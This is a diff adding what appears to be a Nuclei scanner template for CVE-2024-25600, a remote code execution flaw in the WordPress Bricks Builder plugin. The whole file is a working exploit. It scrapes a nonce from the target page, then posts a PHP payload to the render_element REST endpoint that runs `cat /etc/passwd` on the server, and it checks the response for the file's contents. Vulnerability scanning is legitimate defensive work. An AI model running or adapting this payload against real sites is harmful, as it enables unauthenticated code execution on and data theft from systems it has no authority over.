@@ -1,0 +1,58 @@
+id: wordpress-bricks-builder-rce
+info:
+  name: WordPress Bricks Builder RCE (CVE-2024-25600)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2024-25600
+  description: |
+    Remote Code Execution vulnerability in the WordPress Bricks Builder plugin
+    allowing unauthorized users to execute arbitrary PHP code.
+
+http:
+  - id: get-nonce
+    method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'nonce')"
+    extractors:
+      - type: regex
+        name: nonce
+        part: body
+        regex:
+          - '"nonce":"(?P<nonce>.*?)",'
+        internal: true
+
+  - id: post-rce
+    method: POST
+    path:
+      - "{{BaseURL}}/wp-json/bricks/v1/render_element"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "postId": "1",
+        "nonce": "{{nonce}}",
+        "element": {
+          "name": "container",
+          "settings": {
+            "hasLoop": "true",
+            "query": {
+              "useQueryEditor": true,
+              "queryEditor": "ob_start();echo `cat /etc/passwd`;$output=ob_get_contents();ob_end_clean();throw new Exception($output);",
+              "objectType": "post"
+            }
+          }
+        }
+      }
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'root:')"
+          - "contains(body, '/bin')"
+          - "contains(headers, 'application/json')"
